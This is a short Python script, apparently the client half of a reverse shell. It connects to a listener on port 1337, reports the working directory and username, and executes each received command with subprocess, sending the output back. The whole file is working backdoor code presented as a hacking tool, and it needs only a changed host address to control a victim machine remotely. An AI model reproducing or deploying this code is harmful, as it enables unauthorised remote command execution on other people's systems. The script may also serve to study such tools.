"""
Attacker's local machine acts as a server waiting for connections from the vulnerable machine.
"""
import socket
import logging
import os
import getpass
import subprocess

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 1337
BUFFER_SIZE = 1024 * 128
# For hackers only 
DELIMITER = "<hacker>"

def main():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((SERVER_HOST, SERVER_PORT))
	logging.info("connected to server...")

	shell(sock)

def shell(conn):
	logging.info("Started shell session.")
	output = str()

	while True:
		cwd = os.getcwd()
		user = getpass.getuser()

		conn.sendall("{}{}{}{}{}".format(cwd, DELIMITER, user, DELIMITER, output).encode())


		# Receive shell command to execute
		shell_cmd = conn.recv(BUFFER_SIZE).decode()
		output = subprocess.getoutput(shell_cmd)


	logging.info("Shell session terminated")


if __name__ == '__main__':
	logger = logging.getLogger()
	logging.basicConfig(level=logging.INFO)
	main()
